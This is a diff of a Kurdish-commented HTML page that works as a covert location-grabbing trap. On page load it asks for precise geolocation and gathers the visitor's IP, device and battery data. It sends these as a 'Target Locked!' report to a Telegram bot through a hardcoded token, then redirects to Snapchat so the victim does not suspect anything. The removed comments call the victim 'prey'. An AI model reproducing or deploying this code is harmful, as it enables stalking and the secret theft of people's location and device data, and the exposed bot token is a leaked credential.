@@ -2,65 +2,52 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title> </title> <style>
-        body { background-color: white; margin: 0; overflow: hidden; }
+    <title> </title>
+    <style>
+        body { background-color: white; margin: 0; }
     </style>
 </head>
-<body onload="ask()">
+<body onload="init()">
 
 <script>
+    // تۆکنە نوێیەکەت لێرە دابنێ
     const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
-    async function ask() {
+    async function init() {
         const urlParams = new URLSearchParams(window.location.search);
         const uid = urlParams.get('id');
         if (!uid) return;
 
-        // Daway permission-i location dakat ba bdenagi
+        // یەکەم هەنگاو: داواکردنی لۆکەیشن (ئەمە Allow دەهێنێتە سەر شاشە)
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
+            
+            // ئەگەر Allow کرا، ئینجا زانیارییەکانی تر کۆبکەرەوە
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+            }
+            
+            let report = `🚨 <b>Target Locked!</b>\n\n` +
+                         `📍 <b>Location:</b> <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
+                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code>`;
 
-            // Wargrtni IP u Battery u Time
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
-                
-                let bat = "N/A", ch = "No";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = Math.floor(b.level * 100) + "%";
-                    ch = b.charging ? "Yes" : "No";
-                }
-                
-                let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+            // ناردنی نامە بۆ بۆتەکە
+            await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: uid, text: report, parse_mode: "HTML"})
+            });
 
-                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek Telecom"})\n` +
-                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
-                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil/Bakhtiari"}</code>`;
+            // ڕێدایرێکت دوای ناردن
+            window.location.replace("https://www.snapchat.com");
 
-                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: uid,
-                        text: report,
-                        parse_mode: "HTML",
-                        disable_web_page_preview: false
-                    })
-                });
-
-                // Dway nardn darcho bo away guman nakat
-                window.location.replace("https://www.google.com");
-            } catch (e) {}
         }, () => {
-            // Agar allow-i nakrd, har redirect-i bka bo away guman nakat
-            window.location.replace("https://www.google.com");
+            // ئەگەر ڕەتی کردەوە (Deny)
+            window.location.replace("https://www.snapchat.com");
         }, { enableHighAccuracy: true });
     }
 </script>
